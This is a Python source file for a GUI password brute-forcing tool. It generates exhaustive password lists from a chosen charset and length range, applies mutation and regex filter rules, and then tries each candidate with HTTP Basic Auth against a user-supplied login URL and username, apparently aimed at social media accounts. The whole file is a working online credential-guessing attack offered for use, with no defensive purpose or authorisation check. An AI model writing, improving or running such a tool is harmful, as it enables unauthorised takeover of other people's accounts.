import requests
import re
import itertools
from requests.auth import HTTPBasicAuth
import tkinter as tk
from tkinter import messagebox, simpledialog
from typing import List

# ASCII Art Banner
banner = r"""
 _________  ____  ____  ________                  
|  _   _  ||_   ||   _||_   __  |                 
|_/ | | \_|  | |__| |    | |_ \_|                 
    | |      |  __  |    |  _| _                  
   _| |_    _| |  | |_  _| |__/ |                 
 _|_____|  |____||____||________|_____  ________  
|_   __  | .'   `.|_   __ \   .' ___  ||_   __  | 
  | |_ \_|/  .-.  \ | |__) | / .'   \_|  | |_ \_| 
  |  _|   | |   | | |  __ /  | |         |  _| _  
 _| |_    \  `-'  /_| |  \ \_\ `.___.'\ _| |__/ | 
|_____|    `.___.'|____| |___|`.____ .'|________| 
"""

print(banner)

class TheForcePasswordTool:
    def __init__(self, root):
        self.root = root
        self.root.title("TheForce Password Tool")
        self.passwords = []
        self.create_gui()

    def display_message(self, message, color='black'):
        messagebox.showinfo("Message", message)

    def generate_passwords(self, min_length: int, max_length: int, charset: str) -> List[str]:
        try:
            passwords = list(self.generate_passwords_helper(min_length, max_length, charset))
            return passwords
        except Exception as e:
            self.display_message(f'Error: {e}', color='red')
            return []

    def generate_passwords_helper(self, min_length: int, max_length: int, charset: str) -> List[str]:
        if min_length > max_length:
            raise ValueError('Minimum length cannot be greater than maximum length.')
        passwords = []
        for length in range(min_length, max_length + 1):
            for password_tuple in itertools.product(charset, repeat=length):
                password = ''.join(password_tuple)
                passwords.append(password)
        return passwords

    def apply_mutations(self, mutation_rules: List[str]) -> List[str]:
        try:
            mutated_passwords = list(self.apply_mutations_helper(self.passwords, mutation_rules))
            return mutated_passwords
        except Exception as e:
            self.display_message(f'Error: {e}', color='red')
            return []

    def apply_mutations_helper(self, passwords: List[str], mutation_rules: List[str]) -> List[str]:
        mutated_passwords = []
        for password in passwords:
            for rule in mutation_rules:
                action, *details = rule.split()
                if action == 'upper':
                    index = int(details[0])
                    mutated_passwords.append(password[:index] + password[index].upper() + password[index + 1:])
                elif action == 'lower':
                    index = int(details[0])
                    mutated_passwords.append(password[:index] + password[index].lower() + password[index + 1:])
                elif action == 'insert':
                    index, char = details
                    mutated_passwords.append(password[:int(index)] + char + password[int(index):])
                elif action == 'replace':
                    index, char = details
                    mutated_passwords.append(password[:int(index)] + char + password[int(index) + 1:])
                elif action == 'delete':
                    index = int(details[0])
                    mutated_passwords.append(password[:index] + password[index + 1:])
        return mutated_passwords

    def apply_filters(self, regex_filters: List[str]) -> List[str]:
        try:
            filtered_passwords = list(self.apply_filters_helper(self.passwords, regex_filters))
            return filtered_passwords
        except Exception as e:
            self.display_message(f'Error: {e}', color='red')
            return []

    def apply_filters_helper(self, passwords: List[str], regex_filters: List[str]) -> List[str]:
        filtered_passwords = []
        for password in passwords:
            if all(re.fullmatch(pattern, password) for pattern in regex_filters):
                filtered_passwords.append(password)
        return filtered_passwords

    def bruteforce_password(self, username: str, url: str, social_media: str) -> None:
        try:
            for password in self.passwords:
                try:
                    response = requests.get(url, auth=HTTPBasicAuth(username, password))
                    if response.status_code == 200:
                        self.display_message(f'Successfully logged in to {social_media} with password: {password}', color='green')
                    else:
                        self.display_message(f'Failed to log in to {social_media} with password: {password}', color='red')
                except requests.exceptions.RequestException as ex:
                    self.display_message(f'Error while trying to log in: {ex}', color='red')
        except Exception as e:
            self.display_message(f'Error: {e}', color='red')

    def create_gui(self):
        tk.Label(self.root, text="TheForce Password Tool", font=("Helvetica", 16, "bold")).grid(row=0, column=1, pady=10)

        tk.Label(self.root, text="1. Generate Passwords").grid(row=1, column=0, pady=5, sticky=tk.W)
        tk.Label(self.root, text ="2. Apply Mutations").grid(row=2, column=0, pady=5, sticky=tk.W)
        tk.Label(self.root, text="3. Apply Filters").grid(row=3, column=0, pady=5, sticky=tk.W)
        tk.Label(self.root, text="4. Bruteforce Password").grid(row=4, column=0, pady=5, sticky=tk.W)

        choice_label = tk.Label(self.root, text="Select an option (1-4):")
        choice_label.grid(row=5, column=0, pady=5, sticky=tk.W)

        self.choice_var = tk.StringVar()
        self.choice_entry = tk.Entry(self.root, textvariable=self.choice_var)
        self.choice_entry.grid(row=5, column=1, pady=5)

        tk.Button(self.root, text="Execute", command=self.execute_option).grid(row=6, column=1, pady=10)

    def execute_option(self):
        choice = self.choice_var.get()

        if choice == '1':
            min_length = self.get_input("Enter minimum password length: ")
            max_length = self.get_input("Enter maximum password length: ")
            charset = self.get_input("Enter character set: ")
            self.passwords = self.generate_passwords(int(min_length), int(max_length), charset)
            if self.passwords:
                self.display_message("Passwords generated successfully!", color='green')
            else:
                self.display_message("No passwords generated.", color='red')

        elif choice == '2':
            if not self.passwords:
                self.display_message("No passwords available. Please generate passwords first.", color='red')
            else:
                mutation_rules_input = self.get_input("Enter mutation rules (e.g., upper 2, insert 5 !): ")
                mutation_rules = mutation_rules_input.split(',')
                self.passwords = self.apply_mutations(mutation_rules)
                if self.passwords:
                    self.display_message("Mutations applied successfully!", color='green')
                else:
                    self.display_message("No mutated passwords.", color='red')

        elif choice == '3':
            if not self.passwords:
                self.display_message("No passwords available. Please generate or mutate passwords first.", color='red')
            else:
                regex_filters_input = self.get_input("Enter regex filters (e.g., [a-z], [0-9]): ")
                regex_filters = regex_filters_input.split(',')
                self.passwords = self.apply_filters(regex_filters)
                if self.passwords:
                    self.display_message("Filters applied successfully!", color='green')
                else:
                    self.display_message("No passwords after applying filters.", color='red')

        elif choice == '4':
            if not self.passwords:
                self.display_message("No passwords available. Please generate, mutate, or filter passwords first.", color='red')
            else:
                username = self.get_input("Enter username: ")
                url = self.get_input("Enter login URL: ")
                social_media = self.get_input("Enter social media name: ")
                self.bruteforce_password(username, url, social_media)

        else:
            self.display_message("Invalid choice. Please select a valid option (1-4).", color='red')

    def get_input(self, prompt):
        return simpledialog.askstring("Input", prompt, parent=self.root)

if __name__ == '__main__':
    root = tk.Tk()
    app = TheForcePasswordTool(root)
    root.mainloop()
